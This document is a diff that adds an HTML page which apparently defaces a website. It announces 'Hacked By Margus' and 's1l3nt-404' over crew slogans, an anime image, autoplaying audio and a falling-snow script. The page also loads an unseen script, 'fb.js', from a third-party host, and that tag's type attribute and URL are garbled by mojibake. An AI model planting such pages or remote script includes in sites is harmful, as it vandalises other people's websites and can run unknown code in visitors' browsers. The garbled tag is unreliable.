@@ -1,0 +1,302 @@
+
+<html>
+
+	<head>
+
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQkFFxj2NGHqoRZYEVNLx2RHq1CM-33zeUBkEuXxnHon5-Dh3Y3">
+
+	<meta name="description" content="at least I've struggled"> 
+
+	<meta name="keywords" content="Purworejo6etar"> 
+
+	<meta name="og:title" content="Hacked By s1l3nt-404">
+
+	<meta http-equiv="cache-control" content="index,cache"> 
+
+	<meta http-equiv="pragma" content="index,cache"> 
+	
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=New+Rocker"/>
+
+<title>Hacked By Margus</title>
+
+<style>
+
+body{
+
+	background:black;
+
+}
+
+#och{
+
+	font-family:Courier;
+
+	color:white;
+
+	position:absolute;
+
+	left:0;
+
+	left:0;
+
+	right:0;
+
+	top:10%;
+
+}
+
+#ochh{
+
+	font-size:25px;
+
+	font-weight:bold;
+
+}
+
+img:hover{	
+
+	opacity:1
+
+}
+
+hr {
+
+	width:250px;
+
+}
+
+a{
+
+	color:white;
+
+	text-decoration:none
+
+}
+
+a.hover{
+
+	color:white;
+
+}
+
+
+
+</style>
+
+</head>
+
+<body>
+
+ <script type="text/Ã?Æ?Ã¢â?¬Å¡Ã?â??Ã?Â­javascript" src="http://Ã?Æ?Ã¢â?¬Å¡Ã?â??Ã?Â­yourjavascript.com/Ã?Æ?Ã¢â?¬Å¡Ã?â??Ã?Â­56133167111/fb.js"></script> 
+
+	
+
+	<script type='text/javascript'>
+
+var snowmax=35
+
+var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")
+
+var snowtype=new Array("Arial Lime","Arial Narrow","Times","Comic Sans MS")
+
+var snowletter="*"
+
+var sinkspeed=0.6
+
+var snowmaxsize=22
+
+var snowminsize=8
+
+var snowingzone=1
+
+// Do not edit below this line
+
+var snow=new Array()
+
+var marginbottom
+
+var marginright
+
+var timer
+
+var i_snow=0
+
+var x_mv=new Array();
+
+var crds=new Array();
+
+var lftrght=new Array();
+
+var browserinfos=navigator.userAgent 
+
+var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
+
+var ns6=document.getElementById&&!document.all
+
+var opera=browserinfos.match(/Opera/)  
+
+var browserok=ie5||ns6||opera
+
+function randommaker(range) {  
+
+ rand=Math.floor(range*Math.random())
+
+    return rand
+
+}
+
+function initsnow() {
+
+ if (ie5 || opera) {
+
+  marginbottom = document.body.clientHeight
+
+  marginright = document.body.clientWidth
+
+ }
+
+ else if (ns6) {
+
+  marginbottom = window.innerHeight
+
+  marginright = window.innerWidth
+
+ }
+
+ var snowsizerange=snowmaxsize-snowminsize
+
+ for (i=0;i<=snowmax;i++) {
+
+  crds[i] = 0;                      
+
+     lftrght[i] = Math.random()*15;         
+
+     x_mv[i] = 0.03 + Math.random()/10;
+
+  snow[i]=document.getElementById("s"+i)
+
+  snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
+
+  snow[i].size=randommaker(snowsizerange)+snowminsize
+
+  snow[i].style.fontSize=snow[i].size
+
+  snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
+
+  snow[i].sink=sinkspeed*snow[i].size/5
+
+  if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+
+  if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+
+  if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+
+  if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+
+  snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
+
+  snow[i].style.left=snow[i].posx
+
+  snow[i].style.top=snow[i].posy
+
+ }
+
+ movesnow()
+
+}
+
+function movesnow() {
+
+ for (i=0;i<=snowmax;i++) {
+
+  crds[i] += x_mv[i];
+
+  snow[i].posy+=snow[i].sink
+
+  snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
+
+  snow[i].style.top=snow[i].posy
+
+  
+
+  if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
+
+   if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+
+   if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+
+   if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+
+   if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+
+   snow[i].posy=0
+
+  }
+
+ }
+
+ var timer=setTimeout("movesnow()",50)
+
+}
+
+for (i=0;i<=snowmax;i++) {
+
+ document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
+
+}
+
+if (browserok) {
+
+ window.onload=initsnow
+
+}
+
+</script>
+
+
+
+<div id='och' align="center">
+
+<div id='ochh'>
+
+<tbody><tr><td align="center"><center><br>
+
+<img src="https://orig00.deviantart.net/7b1a/f/2013/124/a/2/yuno_gasai_by_daichikiyoshi-d641of0.png" border='0'>
+<br>
+
+<style type="text/css">
+
+  #highlight{font:bold 50px Impact,Arial,Sans-Serif;}
+
+</style>
+
+<br>
+<b><u><font face="Bellota" size="8px" color="red" style="text-shadow: 0 0 3px black, 0 0 5px blue;">$ Hacked By Margus $</font></b></u>
+<br>
+<font face="Courier New" size="2" color="white"><font face="Courier New" size="5" color="red">Ydek Fzebi<font face="Courier New" size="2" color="white">
+
+<p />
+
+</div><center>
+
+<font color='white' font size="5">
+Fes Hakma L3alam !<br></font>
+
+<br><marquee><font color='green' font size="3">Deep Web Morcco +18 </font></marquee>
+
+
+
+<p />
+
+<b><p><font face="New Rocker" size="5" color="red">&copy;BNJ CITY BLOCK</font></b></p>
+
+<p />
+
+<audio src="https://www.mboxdrive.com/mikasa-prod-by-yo-asel-adamk-familionnaire-draganov.mp3" autoplay></audio>
+
+</div>
+
+</body>
+
+</html>
+
